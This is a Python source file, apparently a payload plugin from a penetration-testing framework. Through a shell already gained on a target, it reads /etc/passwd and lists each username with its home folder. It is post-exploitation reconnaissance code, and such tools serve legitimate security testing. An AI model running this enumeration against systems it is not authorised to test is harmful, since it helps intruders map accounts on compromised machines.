import re
from plugins.attack.payloads.base_payload import base_payload

class users_name(base_payload):
    '''
    This payload shows users name
    '''
    def api_read(self):
        result = {}
        users = []

        def parse_users_name( etc_passwd ):
            user = re.findall('^(.*?)\:', etc_passwd,  re.MULTILINE)
            if user:
                return user
            else:
                return ''
                
        def parse_users_folders( etc_passwd ):
            user = re.findall('(?<=/)(.*?)\:', etc_passwd)
            if user:
                return user
            else:
                return ''

        passwd = self.shell.read('/etc/passwd')
        if passwd:
            for i in xrange(len(parse_users_folders(passwd))):
                result[str(parse_users_name(passwd)[i])] ='/'+str(parse_users_folders(passwd)[i])+'/'
        return result
    
    def run_read(self):
        hashmap = self.api_read()
        result = []
        if hashmap:
            result.append('User --> Folder')
        for user, folder in hashmap.iteritems():
            result.append(user+' --> '+folder)
        if result == [ ]:
            result.append('Users name not found.')
        return result
